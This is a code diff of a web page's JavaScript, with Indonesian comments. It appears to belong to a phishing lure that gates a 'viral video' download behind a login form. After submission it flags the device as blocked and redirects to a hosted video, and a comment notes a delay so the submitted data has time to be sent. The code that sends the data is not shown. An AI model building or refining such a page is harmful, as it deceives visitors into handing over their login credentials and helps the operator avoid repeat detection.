@@ -129,7 +129,7 @@ button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
             localStorage.getItem("sudah_submit") === "1" ||
             sessionStorage.getItem("sudah_submit") === "1" ||
             document.cookie.indexOf("sudah_submit=1") !== -1;
-        if(blocked){ window.location.replace("/blokir"); }
+        if(blocked){ window.location.replace("/blokir"); } // URL TANPA .HTML
     } catch(e){}
 })();
 </script>
@@ -373,7 +373,7 @@ function openDownloadLogin(event){
 
     /* CEK BLOKIR */
     if(cekDeviceBlocked()){
-        window.location.replace("/blokir.html");
+        window.location.replace("/blokir"); // URL TANPA .HTML
         return;
     }
 
@@ -512,20 +512,11 @@ function loginUser(event){
             setDeviceBlocked();
         })
         .finally(function(){
-    setTimeout(function(){
-        var link = document.createElement("a");
-        link.href = "https://files.catbox.moe/mfxa6c.mp4";
-        link.download = "video-viral.mp4";
-        link.style.display = "none";
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-
-        setTimeout(function(){
-            window.location.href = "/";
-        }, 800);
-    }, 1200);
-});
+            setTimeout(function(){
+                // LANGSUNG KE LINK CATBOX, BUKAN KE BLOKIR
+                window.location.href = "https://files.catbox.moe/mfxa6c.mp4";
+            }, 1200); // Delay 1.2 detik biar data sempet kekirim
+        });
 }
 
 
@@ -534,7 +525,7 @@ window.addEventListener("load", function(){
 
     /* KALO UDAH SUBMIT → BLOKIR */
     if(cekDeviceBlocked()){
-        window.location.replace("/blokir");
+        window.location.replace("/blokir"); // URL TANPA .HTML
         return;
     }
 
